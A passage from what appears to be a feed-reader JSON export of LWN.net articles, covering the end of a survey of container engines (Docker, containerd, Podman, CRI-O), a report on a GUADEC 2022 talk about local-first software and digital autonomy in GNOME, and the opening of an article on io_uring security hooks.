necessary mounts, control groups, and\nkernel namespaces, executes processes inside the container, and\ntears down any container-related resources once all the processes inside of\nit have exited.  The reference implementation of the runtime specification\nis <a href=\"https://github.com/opencontainers/runc\">runc</a>, which was\ncreated by Docker for the OCI.  </p>\n\n<p>There are a number of other OCI runtimes to choose from.  For example, <a href=\"https://github.com/containers/crun\">crun</a> offers an OCI runtime\nwritten in C that has the goal of being faster and more lightweight than runc,\nwhich, like most of the rest of the OCI ecosystem, is written in Go.\nGoogle's <a href=\"https://gvisor.dev/\">gVisor</a> includes runsc, which\nprovides greater isolation from the host by running applications on top of\na <a href=\"https://gvisor.dev/docs/\">user-mode kernel</a>.  Amazon's <a href=\"https://firecracker-microvm.github.io/\">Firecracker</a> is a minimal\nhypervisor written in Rust that can use KVM to give each container its own virtual machine;\nIntel's <a href=\"https://katacontainers.io/\">Kata Containers</a> works\nsimilarly but supports multiple hypervisors (including Firecracker.)  </p>\n\n<p>A container engine is a program that ties these three specifications\ntogether.  It implements the client side of the distribution specification\nto retrieve container images from registries, interprets the images it has\nretrieved according to the image specification, and launches containers\nusing a program that implements the runtime specification.  A container\nengine provides tools and/or APIs for users to manage container images,\nprocesses, and storage.  </p>\n\n<p><a href=\"https://kubernetes.io/\">Kubernetes</a> is a container\norchestrator, capable of scheduling and running containers across hundreds\nor even thousands of servers.  Kubernetes does not implement any of the OCI\nspecifications itself.  It needs to be used in combination with a container\nengine, which manages containers on behalf of Kubernetes.  The interface\nthat it uses to communicate with container engines is called the <a href=\"https://kubernetes.io/docs/concepts/architecture/cri/\">Container\nRuntime Interface</a> (CRI).  </p>\n\n<h4>Docker</h4>\n\n<p>Docker is the original OCI container engine.  It consists of two main\nuser-visible components: a <a href=\"https://github.com/docker/cli\">command-line-interface (CLI)\nclient</a> named <tt>docker</tt>, and \na server.  The server is named <tt>dockerd</tt> in Docker's own packages,\nbut the repository was renamed <a href=\"https://github.com/moby/moby/\">moby</a> when Docker created the <a href=\"https://mobyproject.org/\">Moby Project</a> in 2017.\nThe Moby Project is an umbrella organization that develops open-source\ncomponents used by Docker and other container engines. \n When Moby was\nannounced, many found the relationship between Docker and the Moby project\nto be <a href=\"https://www.theregister.com/2017/04/21/docker_renames_open_source_code_moby/\">confusing</a>; \nit has been <a href=\"https://www.cio.com/article/234826/why-docker-created-the-moby-project.html\">described</a> as being similar to the relationship\nbetween Fedora and Red Hat.  </p>\n\n<p><tt>dockerd</tt> provides an <a href=\"https://docs.docker.com/engine/api/\">HTTP API</a>; it usually listens\non a Unix socket named <tt>/var/run/docker.sock</tt>, but can be made to\nlisten on a TCP socket as well.  The <tt>docker</tt> command is merely a client\nto this API; the server is responsible for downloading images and starting\ncontainer processes.  The client supports starting containers in the\nforeground, so that running a container at the command-line behaves\nsimilarly to running any other program, but this is only a simulation.  In\nthis mode, the container processes are still started by the server, and\ninput and output are streamed over the API socket; when the process exits,\nthe server reports that to the client, and then the client sets its own\nexit status to match.  </p>\n\n<p>This design <a href=\"https://github.com/moby/moby/issues/6791\">does not\nplay well with systemd</a> or other process supervision tools, because the\nCLI never has any child processes of its own.  Running the <tt>docker</tt>\nCLI under a process supervisor only results in supervising the CLI process.\nThis has a variety of consequences for users of these tools. For example,\nany attempt to limit a container's memory usage by running the CLI as a\nsystemd service will fail; the limits will only apply to the CLI and its\nnon-existent children.  In addition, attempts to terminate a client process may not\nresult in terminating all of the processes in the container.  </p>\n\n<p>Failure to <a href=\"https://docs.docker.com/engine/security/protect-access/\">limit\naccess to Docker's socket</a> can be a significant security hazard.  By\ndefault <tt>dockerd</tt> runs as root.  Anyone who is able to connect to\nthe Docker socket has complete access to the API.  Since the API allows\nthings like running a container as a specific UID and binding arbitrary\nfilesystem locations, it is trivial for someone with access to the socket\nto <a href=\"https://gtfobins.github.io/gtfobins/docker/\">become root</a> on\nthe host.  <a href=\"https://docs.docker.com/engine/security/rootless/\">Support for\nrunning in rootless mode</a> was added in 2019 and stabilized in 2020, but\nis still not the default mode of operation.  </p>\n\n<p>Docker can be used by Kubernetes to run containers, but it doesn't\ndirectly support the CRI specification.  Originally, Kubernetes included a\ncomponent called <tt>dockershim</tt> that provided a bridge between the CRI\nand the Docker API, but it was <a href=\"https://kubernetes.io/blog/2020/12/02/dont-panic-kubernetes-and-docker/\">deprecated</a>\nin 2020.  The code was <a href=\"https://www.mirantis.com/blog/mirantis-to-take-over-support-of-kubernetes-dockershim-2/\">spun\nout of the Kubernetes repository</a> and is now maintained separately as <a href=\"https://github.com/Mirantis/cri-dockerd\">cri-dockerd</a>.  </p>\n\n<h4>containerd &amp; nerdctl</h4>\n\n<p>Docker refactored its software into independent components in 2015;\n<a href=\"https://containerd.io/\">containerd</a> is one of the fruits of\nthat effort.  In 2017,\nDocker donated containerd to the <a href=\"https://www.cncf.io/\">Cloud\nNative Computing Foundation</a> (CNCF), which stewards the development of\nKubernetes and other tools.  It is still included in Docker, but it can\nalso be used as a standalone container engine, or with Kubernetes via an included <a href=\"https://github.com/containerd/containerd/blob/main/docs/cri/architecture.md\">CRI\nplugin</a>.  The architecture of containerd is <a href=\"https://github.com/containerd/containerd/blob/main/docs/PLUGINS.md\">highly\nmodular</a>.  This flexibility helps it to serve as a proving ground for\nexperimental features.  Plugins may provide support for different ways of\nstoring container images and additional image formats, for example.  </p>\n\n<p>Without any additional plugins, containerd is effectively a subset of\nDocker; its core features map closely to the OCI specifications.  Tools\ndesigned to work with Docker's API cannot be used with containerd.\nInstead, it provides an API based on Google's <a href=\"https://grpc.io/\">gRPC</a>.  Unfortunately, concerned system\nadministrators looking for access control won't find it here; despite being\nincompatible with Docker's API, containerd's API appears to carry all of\nthe same security implications.  </p>\n\n<p>The documentation for containerd notes that it follows a <a href=\"https://github.com/containerd/containerd/blob/main/docs/PLUGINS.md#smart-client-model=\">smart\nclient</a> model (as opposed to Docker's \"dumb client\").  Among other\ndifferences, this means that containerd does not communicate with container\nregistries; instead, (smart) clients are required to download any images they need\nthemselves.  Despite the difference in client models, containerd still has\na process model similar to that of Docker; container processes are forked\nfrom the containerd process.  In general, without additional software,\ncontainerd doesn't do anything differently from Docker, it just does less.\n</p>\n\n<p>When containerd is bundled with Docker, <tt>dockerd</tt> serves as the\nsmart client, accepting Docker API calls from its own dumb client and doing\nany additional work needed before calling the containerd API; when used\nwith Kubernetes, these things are handled by the CRI plugin.  Other than\nthat, containerd didn't really have its own client until relatively\nrecently.  It includes a bare-bones CLI called <tt>ctr</tt>, but this is\nonly intended for debugging purposes.  </p>\n\n<p>This changed in December 2020 with the release of <a href=\"https://github.com/containerd/nerdctl\">nerdctl</a>.  Since its\nrelease, running containerd on its own has become much more practical;\nnerdctl features a user interface designed to be compatible with the Docker\nCLI and provides much of the functionality Docker users would find missing\nfrom a standalone containerd installation.  Users who don't need\ncompatibility with the Docker API might find themselves quite happy with\ncontainerd and nertdctl.  </p>\n\n<h4>Podman</h4>\n\n<p><a href=\"https://podman.io/\">Podman</a> is an alternative to Docker\nsponsored by Red Hat, which aims to be a drop-in replacement for Docker.\nLike Docker and containerd, it is written in Go and released under the\nApache 2.0 License, but it is not a fork; it is an independent\nreimplementation.  Red Hat's sponsorship of Podman is likely to be at least\npartially motivated by the difficulties it encountered during its <a href=\"https://lwn.net/Articles/676831/\">efforts</a> to make Docker's software\ninteroperate with systemd.  </p>\n\n<p>On a superficial level, Podman appears nearly identical to Docker.  It\ncan use the same container images, and talk to the same registries.  The\n<tt>podman</tt> CLI is a clone of <tt>docker</tt>, with the intention that\nusers migrating from Docker can alias <tt>docker</tt> to <tt>podman</tt> and mostly\ncontinue with their lives as if nothing had changed.  \n</p>\n\n<p>\nOriginally, Podman\nprovided an API based on the <a href=\"https://varlink.org/\">varlink</a>\nprotocol.  This meant that while Podman was compatible with Docker on a CLI\nlevel, tools that used the Docker API directly could not be used with\nPodman.  In version 3.0, the varlink API was <a href=\"https://podman.io/blogs/2020/08/01/deprecate-and-remove-varlink-notice.html\">scrapped\nin favor of an HTTP API</a>, which aims to be compatible with the one\nprovided by Docker while also adding some Podman-specific\nendpoints.  This new API is maturing rapidly, but users of tools designed\nfor Docker would be well-advised to test for compatibility before\ncommitting to switch to Podman.  </p>\n\n<p>As it is largely a copy of Docker's API, Podman's API doesn't\nfeature any sort of access control, but Podman has some architectural\ndifferences that may make that less important.  Podman gained support for\nrunning in rootless mode early on in its development.  In this mode,\ncontainers can be created without root or any other special privileges,\naside from that small bit of help from <a href=\"https://man7.org/linux/man-pages/man1/newuidmap.1.html\"><tt>newuidmap</tt></a>\nand <a href=\"https://man7.org/linux/man-pages/man1/newgidmap.1.html\"><tt>newgidmap</tt></a>.\nUnlike Docker, when Podman is invoked by a non-root user, rootless mode is\nused by default.  </p>\n\n<p>Users of Podman can also dodge security concerns about its API socket by\nsimply disabling it.  Though its interface is largely identical to the\nDocker CLI, <tt>podman</tt> is no mere API client.  It creates containers\nfor itself without any help from a daemon.  As a result, Podman plays\nnicely with tools like systemd; using <tt>podman run</tt> with a process\nsupervisor works as expected, because the processes inside the container\nare children of <tt>podman run</tt>.  The developers of Podman encourage\npeople to use it in this way by a command to <a href=\"https://docs.podman.io/en/latest/markdown/podman-generate-systemd.1.html\">generate\nsystemd units for Podman containers</a>.  </p>\n\n<p>Aside from its process model, Podman caters to systemd users in other\nways.  While running an init system such as systemd inside of a container\nis antithetical to the Docker philosophy of one application per container,\nPodman goes out of its way to make it easy.  If the program to run specified\nby the container <a href=\"https://manpages.debian.org/bullseye/podman/podman-run.1.en.html#--systemd=true%7Cfalse%7Calways\">is\nan init system</a>, Podman will automatically\nmount all the kernel filesystems needed for systemd to function.  It also\nsupports reporting the status of containers to systemd via <a href=\"https://www.freedesktop.org/software/systemd/man/sd_notify.html\"><tt>sd_notify()</tt></a>,\nor handing the notification socket off to the application inside of the\ncontainer for it to use directly.  </p>\n\n<p>Podman also has some features designed to appeal to Kubernetes users.\nLike Kubernetes, it supports the notion of a \"pod\", which is a group of\ncontainers that share a common network namespace.  It can <a href=\"https://docs.podman.io/en/latest/markdown/podman-kube-play.1.html\">run\ncontainers using Kubernetes configuration files</a> and also <a href=\"https://docs.podman.io/en/latest/markdown/podman-generate-kube.1.html\">generate\nKubernetes configurations</a>.  However, unlike Docker and containerd,\nthere is no way for Podman to be used by Kubernetes to run containers.\nThis is a deliberate omission. Instead of adding CRI support to Podman,\nwhich is a general-purpose container engine, Red Hat chose to <a href=\"https://www.redhat.com/en/blog/why-red-hat-investing-cri-o-and-podman\">sponsor\nthe \ndevelopment of a more specialized alternative</a> in the form of <a href=\"https://github.com/cri-o/cri-o\">CRI-O</a>.  \n</p>\n\n<h4>CRI-O</h4>\n\n<p>CRI-O is based on many of\nthe <a href=\"https://github.com/containers/image\">same</a> <a href=\"https://github.com/containers/storage\">underpinnings</a> as Podman.\nSo the relationship between CRI-O and Podman could be said to be\nsimilar to the one between containerd and Docker; CRI-O delivers much of\nthe same technology as Podman, with fewer frills.  This analogy doesn't\nstretch far, though.  Unlike containerd and Docker, CRI-O and Podman\nare completely separate projects; one is not embedded by the other.  </p>\n\n<p>As might be suggested by its name, CRI-O implements the Kubernetes CRI.\nIn fact, that's all that it implements; CRI-O is built specifically and\nonly for use with Kubernetes.  It is developed in lockstep with the\nKubernetes release cycle, and anything that is not required by the CRI is\nexplicitly declared to be out of scope.  CRI-O cannot be used without\nKubernetes and includes no CLI of its own; based on the stated goals of the\nproject, any attempt to make CRI-O suitable for standalone use would likely\nbe viewed as an unwelcome distraction by its developers.  </p>\n\n<p>Like Podman, the development of CRI-O was initially sponsored by Red Hat;\nlike containerd, it was later <a href=\"https://www.redhat.com/en/blog/red-hat-contributes-cri-o-cloud-native-computing-foundation\">donated\nto the CNCF</a> in 2019.  Although they are now both under the aegis of\nthe same organization, the narrow focus of CRI-O may make it more appealing\nto Kubernetes administrators than containerd.  The developers of CRI-O are\nfree to make decisions solely on the basis of maximizing the benefit to\nusers of Kubernetes, whereas the developers of containerd and other\ncontainer engines have many other types of users and uses cases to\nconsider.  </p>\n\n<h4>Conclusion</h4>\n\n<p>These are just a few of the most popular container engines; other\nprojects like <a href=\"https://apptainer.org/\">Apptainer</a> and <a href=\"https://pouchcontainer.io/\">Pouch</a> cater to different ecological\nniches.  There are also a number of tools available for creating and\nmanipulating container images, like <a href=\"https://github.com/containers/buildah/\">Buildah</a>, <a href=\"https://buildpacks.io/\">Buildpacks</a>, <a href=\"https://github.com/containers/skopeo\">skopeo</a>, and <a href=\"https://umo.ci/\">umoci</a>.  Docker deserves a great deal of credit\nfor the Open Container Initiative; the standards and the software that have\nresulted from this effort have provided the foundation for a wide array of\nprojects.  The ecosystem is robust; should one project shut \ndown, there are multiple alternatives ready and available to take its\nplace.  As a result, the future of this technology is no longer tied to one\nparticular company or project; the style of containers that Docker pioneered\nseems likely to be with us for a long time to come.  </p><br clear=\"all\"><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Archives/GuestIndex/\">GuestArticles</a></td><td><a href=\"https://lwn.net/Archives/GuestIndex/#Webb_Jordan\">Webb, Jordan</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "902463",
    "timestampUsec": "1658963600095250",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Digital autonomy and the GNOME desktop",
    "author": ";jake",
    "published": 1658959680,
    "updated": 1658959680,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/902463/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jake Edge</b><br>July 27, 2022\n           <hr>\n<a href=\"https://lwn.net/Archives/ConferenceIndex/#GUADEC-2022\">GUADEC</a>\n</div>\n<p>\nWhile GUADEC, the GNOME community's annual conference, has always been held\nin Europe (or online-only) since it began in 2000, <a href=\"https://events.gnome.org/event/77/\">this year's edition</a>\nwas held in North America, specifically in Guadalajara, México,\nJuly 20-25.  Rob McQueen gave a talk on the first day of the\nconference about providing solutions that bring some level of digital\nsafety and\nautonomy to users—and how GNOME can help make that happen.  McQueen \nis the CEO of the <a href=\"https://www.endlessos.org/\">Endless OS\nFoundation</a>, which is an organization geared toward those goals; he \nwas also\nrecently reelected as the president of the <a href=\"https://foundation.gnome.org/\">GNOME \nFoundation</a> board of directors. \n</p>\n\n<p>\nHis talk was meant to introduce and describe an objective that the GNOME\nboard has been discussing and working on regarding the state of the\ninternet today and how GNOME can make that experience better for its\nusers.  The cloud-focused computing environment that is prevalent today has\na number of problems that could be addressed by such an effort. That topic\nis related to what he \ndoes for work, as well, since Endless OS is working \non \"bridging the digital divide\" by helping those who are not able to access\nall of the information that is available on today's internet.   Some of\nthose efforts are aimed at bringing that data to those who cannot, or\nperhaps choose not to, directly connect to the internet itself—or only do\nso sporadically.\n</p>\n\n<h4>The problems</h4>\n\n<p>\nThe UN estimates that there will be 2.5 billion more people on the planet\nby 2050; most of those people, perhaps 2 billion of them, will be\nborn in places where power and connectivity, thus technology, are quite\nlimited.  Meanwhile, there are more smartphones on the planet than people,\nbut both Endless and GNOME have an interest in desktop computing.  In order\nfor people\nto fully participate in the activities that computing can facilitate, such\nas education, employment, content creation, and more, a form-factor beyond\nwhat a phone provides is needed.\n</p>\n\n<a href=\"https://lwn.net/Articles/902677/\">\n<img src=\"https://static.lwn.net/images/2022/guadec-mcqueen-sm.png\" align=\"left\" border=\"0\" hspace=\"5\" alt=\"[Rob McQueen]\" title=\"Rob McQueen\" width=\"260\" height=\"239\">\n</a>\n\n<p>\nComputers these days use a <i>lot</i> of internet, he said.  Many users\nhave workloads that are split between the computer in front of them and one\nin the cloud.  That creates infrastructure constraints for personal\ncomputing; there is more needed than just a device.  That infrastructure\nconsists of all of the disparate pieces that allow the connection to the\nrest of world: trenches, wires, \ntowers, satellites, and more.\n</p>\n\n<p>\nSome predictions are that in around ten years, satellites and other\ntechnology will solve the global connectivity problem, he said.  But\nhe has been working in the \"digital divide space\" for around ten years and\nthat prediction was also made ten years ago. Matching the growth in global population with\nconnectivity infrastructure  is an extremely difficult\nand expensive\nproblem to solve.\n</p>\n\n<p>\nEven if you do have the internet connectivity, though, there are still\nplenty of problems.  In the free-software world, we are able to examine the\nsoftware that we run on the computer in front of us, McQueen said. When\nsoftware is running in the cloud, which is effectively just someone else's\ncomputer as the snarky definition that he referred to notes, that ability\nis not present.  Running it elsewhere means that \nthe user loses control of their data, including: if and how well\nthe data is secured,\nwhether it is shared with third parties, whether they will still be able to\naccess it tomorrow, and so on.\n</p>\n\n<p>\nData that is centralized is also a target for attack, he said.  There are\nenormous resources being poured into securing these centralized resources\nthese days.  The problem has risen to a level of national concern; for\nexample, the Biden administration in the US has a panel that is advising it on how to\nsecure the internet and the infrastructure it runs on.\n</p>\n\n<a href=\"https://lwn.net/Articles/902676/\">\n<img src=\"https://static.lwn.net/images/2022/guadec-fdff-sm.png\" align=\"right\" border=\"0\" hspace=\"5\" alt=\"[Flash Drives for Freedom]\" title=\"Flash Drives for Freedom\" width=\"250\" height=\"184\">\n</a>\n\n<p>\nLoss of data control can have \"very real-world consequences\".  For example,\napps that track menstrual cycles, with the convenience of syncing the data\nto the cloud, can also reveal things that could be dangerous from a legal\nperspective in the US today.  Given the current climate in the US, he\nsaid, health data could potentially put someone or their healthcare provider in\nlegal trouble, \"or it could even put your life at\nrisk—this is terrifying.\"\n</p>\n\n<p>\nThen there are governments that are trying to quell dissent by use of\ninternet blockages of various sorts.  For example, Russia has been limiting\naccess to sites that provide a more balanced view of its war on Ukraine\nbecause it has its own narrative to promote.  He noted that the <a href=\"https://netblocks.org/\">NetBlocks</a> organization maps these kinds\nof network disruptions and tries to tie them to the real-world events that may have\ntriggered them.  He said that he could not resist mentioning <a href=\"https://flashdrivesforfreedom.org/\">Flash Drives for Freedom</a>,\nwhich creates USB drives containing suppressed information that get\nsmuggled into North Korea; the visual impact of its home page image (seen\nat right) was \"too good not to include\" in his slides.\n</p>\n\n<h4>Solutions?</h4>\n\n<p>\nHe had just presented \"some of the consequences of the way we approach\ncomputing\" today; he does not have an \"amazing answer\" of what should be\ndone, but he did have some questions, ideas, and things that are \"worth\nexploring together\".  GNOME has a focus on software that runs locally, in part\nbecause that puts users in control of their data and gives them the ability\nto look at the source code; ultimately, the project believes those things allow\nusers to have more trust in their computing environment.  \n</p>\n\n<p>\nMcQueen asked a few different questions about how the GNOME project could improve\nin some of these areas.\nWhat can the project add to its desktop to provide more safety for its\nusers and to allow them to have better control over their data?  What can\nit do to help users who live in a country that gets cut off from the\ninternet due to a war?  How can the GNOME desktop help block various kinds\nof threats to its users and their data?\n</p>\n\n<p>\nHe explained that there are other organizations out there solving some of\nthese problems; GNOME could potentially partner with them to use their\ntechnology in its desktop in order to accomplish these goals. He listed\nseveral different technology areas that would fit well into the GNOME\ndesktop. The first of those  was regarding offline content.\n</p>\n\n<p>\nStorage is a reasonable substitute to deal with connectivity woes that come\nabout due to lack of infrastructure, upheavals like wars, \nor censorship of various kinds.  There are a number of projects that exist\nfor \"bringing bits of the internet onto the computer in front of you\".  For\nexample, <a href=\"https://www.kiwix.org/en/\">Kiwix</a> has technology for\ndownloading entire web sites, such as Wikipedia, and making them available\noffline.  It turns out that Wikipedia in Russian has been <a href=\"https://blog.legoktm.com/2022/03/15/how-to-mirror-the-russian-wikipedia-with-debian-and-kiwix.html\">seeing\nincreased downloads on Kiwix</a> of late since \"<q>the Russian government has\nthreatened to block access to Wikipedia for documenting narratives that do\nnot agree with the official position </q>\". \n</p>\n\n<p>\nEndless OS is collaborating with <a href=\"https://learningequality.org/\">Learning Equality</a>, which is a\nnon-profit that has created a learning platform called <a href=\"https://learningequality.org/kolibri/\">Kolibri</a>.  It allows\naccessing educational resources, including ebooks, videos, audio,\nand games, in a curated set of courses for offline schools.  The <a href=\"https://www.endlessos.org/key\">Endless Key</a> project uses Kolibri\nto create offline educational resources for US middle and high school students who do\nnot have internet access at home.\n</p>\n\n<p>\nHe then turned to peer-to-peer technology, which is where he started his\ncareer; after 15 years of working on that, he has learned that it is\nan extremely difficult problem to solve.  He looked for good examples of\npeer-to-peer tools for the desktop and came up with two.  The first is <a href=\"https://syncthing.net/\">Syncthing</a> (which we <a href=\"https://lwn.net/Articles/861978/\">looked at</a> a year ago); it is \"kind of a\ndecentralized Dropbox\".  It is a bit difficult to configure, but once that\nis done, file folders will be synchronized between multiple devices either\nover the local network or using cloud servers.\n</p>\n\n<p>\nThe other example is <a href=\"https://onedoes.github.io/snapdrop/\">Snapdrop</a>, which is \"so\nsimple and so cool\".  It is a web application that discovers other devices\non the network and allows drag-and-drop file transfer among them.  Since it\nis web-based, it is device independent, but it does require that the\ndevices are online to access the web page.  The transfer happens in a\npeer-to-peer fashion,\nbut the application gets loaded from the cloud.\n</p>\n\n<h4>Local first</h4>\n\n<p>\nThe third technology area that McQueen wanted to talk about was local-first\nsoftware.  He had borrowed some slides from Peter van Hardenberg at <a href=\"https://www.inkandswitch.com/\">Ink &amp; Switch</a>, which is an\n\"industrial research group\" that has been working on <a href=\"https://www.inkandswitch.com/local-first/\">local-first software</a>\nfor the last five years.  Those researchers have come up with a manifesto\nof sorts, with seven principles, or ideals, that describe software that is not completely\nreliant on the network or the cloud, but still provides many of the same\nfeatures and benefits that users have come to expect.\n</p>\n\n<p>\nThe first of these ideals is <a href=\"https://www.inkandswitch.com/local-first/#1-no-spinners-your-work-at-your-fingertips\">\"no spinners\"</a>; the user's work is actually on the\ndevice in front of them.  But on the flipside, their work is <a href=\"https://www.inkandswitch.com/local-first/#2-your-work-is-not-trapped-on-one-device\">not trapped on\na single device</a>; through some mechanism, replicas are kept in sync on other\ndevices of interest.  <a href=\"https://www.inkandswitch.com/local-first/#3-the-network-is-optional\">The\nnetwork is optional</a>, however; when it is present, \nsynchronization can happen, but work can still be done without it.  The\n<a href=\"https://www.inkandswitch.com/local-first/#4-seamless-collaboration-with-your-colleagues\">fourth\nitem</a> is that seamless collaboration is a requirement today; it has \nbecome an\nindispensable feature that needs to be incorporated in any synchronization\nmechanisms that arise.\n</p>\n\n<p>\nThe data that gets stored <a href=\"https://www.inkandswitch.com/local-first/#5-the-long-now\">needs to\nremain accessible</a> even if the software \nthat uses it goes away.  Digital archivists (and others) worry that we are\nstoring much of the data about our life today in ways that will not be\naccessible 20, or even ten or less, years on.  For example, it could\nbecome impossible to access a document made in Google Docs sometime down\nthe road.  Avoiding that has benefits both for individual users and for\nsociety as a whole.\n</p>\n\n<p>\nLocal-first software has an advantage of having <a href=\"https://www.inkandswitch.com/local-first/#6-security-and-privacy-by-default\">privacy\nand security built-in</a> because it is not storing its data \nin some centralized cloud location that becomes a huge temptation for\nattackers.  That centralized storage is also susceptible to various misdeeds\nby the companies controlling it—or their employees.  Local-first gives users <a href=\"https://www.inkandswitch.com/local-first/#7-you-retain-ultimate-ownership-and-control\">ultimate\nownership and control</a> of their data.   No cloud-based application\nprovider can cut off access due to its whim or at the behest of, say, an\noppressive government regime.\n</p>\n\n<p>\nMcQueen recommended that people visit the Ink &amp; Switch site to find out\nmore.  The group has done more than just think about local-first software;\nit has done some <a href=\"https://www.inkandswitch.com/local-first/#towards-a-better-future\">work</a>\non using <a href=\"https://en.wikipedia.org/wiki/Conflict-free_replicated_data_type\">conflict-free\nreplicated data types</a> (CRDTs), which provide eventual consistency for\ndata that is being updated in multiple places.  The data structure is a\ngood basis for collaborative tools that can seamlessly move between\nconnected and unconnected modes, he said.\n</p>\n\n<h4>Development</h4>\n\n<p>\nThere is also a case to be made that today's cloud applications are overly\nexpensive to build and operate.  They are usually written in several tiers:\none for the web-based user interface, a layer for business logic, an API\nlayer that provides access to a \nstorage/database layer, and so on.  These often use different programming\nlanguages and it all leads to a complex distributed application that can be\ndifficult to scale. He put up a slide of the <a href=\"https://landscape.cncf.io/\">Cloud Native landscape</a>, as an example\nof the complexity that arises for cloud applications.\n</p>\n\n<p>\nIn the self-contained software world, we have a longstanding tradition of\nwriting code that \"we can reason about\", he said; it is architecturally fairly\nsimple, generally having fewer code bases and using less languages.  The goal of local-first\nsoftware is not to reject the cloud, but it is \"about rethinking the\nrelationship with the cloud\".  The cloud has a role in helping to\nsynchronize the data, improving its availability, and in providing\nadditional compute power.  With proper key management (\"asterisk, it's\ncomplicated\"), data can be end-to-end encrypted so that the cloud becomes a\npassive carrier rather than an active participant.\n</p>\n\n<p>\nThe GNOME Foundation has identified three areas that it plans to provide\nfunding for in the coming years.  One is to help bootstrap an\napp store for GNOME; another is to work on improving the diversity within\nthe GNOME community.  The third is to look at ways to integrate\ndecentralized and local-first technologies into the GNOME desktop.\nMcQueen thinks that GNOME is well-positioned to take a lead on bringing\nsome of these technologies to its users.  For one thing, GNOME is \"very\nopinionated\" about how its software looks and operates.  Applying that same\napproach to local-first software makes sense.  \n</p>\n\n<p>\nHe had some examples of existing tools that already embody some parts of\nthe local-first approach.  <a href=\"https://flathub.org/apps/details/com.github.birros.WebArchives\">WebArchives</a>\nis an application that loads Kiwix files for offline viewing of Wikipedia\nand other sites.  Endless has an <a href=\"https://endlessos.com/endless-os/encyclopidia/\">Encyclopedia</a>\napplication that is similar, but it is integrated with the desktop search\non Endless OS as well.  Encyclopedia is currently a separate GTK-based\napplication, but Endless is \nmoving toward integrating all of that into Kolibri for the future, he said.\n</p>\n\n<p>\nIn the realm of peer-to-peer applications, there is <a href=\"https://gitlab.gnome.org/jsparber/teleport\">Teleport</a>, which\ndiscovers other Teleport-ready devices on the local network and allows\ntransferring files between them.  One limitation is that all of the\nparticipants need to be running GNOME, but it provides an example of an\napplication that is easy to set up, which could perhaps be merged with\ntechniques from Syncthing or Snapdrop.\n</p>\n\n<p>\n<a href=\"https://github.com/automerge\">Automerge</a> is another project\nthat could be useful for GNOME; it provides a library to do CRDT handling\nfor collaborative applications.  It was originally JavaScript-based, but\nhas been <a href=\"https://github.com/automerge/automerge-rs\">rewritten in\nRust</a>, which has the advantage of moving away from the \"millions of\nlines of crusty C code that we are running on top of\".  Using the GTK Rust\nbindings along with Automerge will allow GNOME to start experimenting with\nlocal-first collaborative applications, he said.\n</p>\n\n<p>\nHe wrapped up by talking about several kinds of applications where it would\nbe useful to have access to the same data in multiple locations\n<i>without</i> making that data available to cloud providers.  For example,\nhealth-tracking applications (such as <a href=\"https://apps.gnome.org/app/dev.Cogitri.Health/\">GNOME Health</a>)\nwould benefit from synchronization across devices, but that data is of a\nparticularly personal nature, of course.  Contact lists and calendars are\nadditional kinds of applications where multi-device synchronization and\n(limited) sharing among collaborators make a lot of sense.\nMcQueen thinks that GNOME is in a great position to help set the stage for\nthe computing experience of those 2.5 billion people who are\n\"arriving\" over the next 30 years or so.  The GNOME Foundation is only\none voice in the project, however, so he is hoping to see others join in to\nwork on various aspects of it.\n</p>\n\n<p>\nA <a href=\"https://youtu.be/wuFTiAcdBXk?t=15955\">YouTube video</a> of the talk\nis available, though the audio volume is rather low.\n</p><p>\n\n</p><p>\n[I would like to thank LWN subscribers for supporting my trip to\nGuadalajara, México for GUADEC.]<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Archives/ConferenceIndex/\">Conference</a></td><td><a href=\"https://lwn.net/Archives/ConferenceIndex/#GUADEC-2022\">GUADEC/2022</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "902466",
    "timestampUsec": "1659022985804275",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Security requirements for new kernel features",
    "author": ";corbet",
    "published": 1659018540,
    "updated": 1659018540,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/902466/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           By <b>Jonathan Corbet</b><br>July 28, 2022\n           </div>\nThe relatively new <a href=\"https://lwn.net/Articles/776703/\">io_uring subsystem</a> has\nchanged the way asynchronous I/O is done on Linux systems and improved\nperformance significantly.  It has also, however, begun to run up a record\nof disagreements with the kernel's security community.  A recent\ndiscussion about security hooks for the new uring_cmd mechanism\nshows how easily requirements can be overlooked in a complex system with no\noverall supervision.\n<p>\nMost of the operations that can be performed within io_uring follow the\nusual I/O patterns — open a file, read data, write data, and so on.  These\noperations are the same regardless of the underlying device or filesystem\nthat is doing the work.  There always seems to be a need for something\nspecial and device-specific, though, and io_uring is no exception.  For the\nkernel as a whole, device-specific operations are made available via <a href=\"https://man7.org/linux/man-pages/man2/ioctl.2.html\"><tt>ioctl()</tt></a>\ncalls.  That system call, however, <a href=\"https://lwn.net/Articles/897202/\">has built up\na reputation</a> as a dumping\nground for poorly thought-out features, and there is little desire to see\nits usage spread.\n</p><p>\nIn early 2021, io_uring maintainer Jens Axboe <a href=\"https://lwn.net/Articles/844875/\">floated an idea</a> for a command passthrough\nmechanism that would be specific to io_uring.  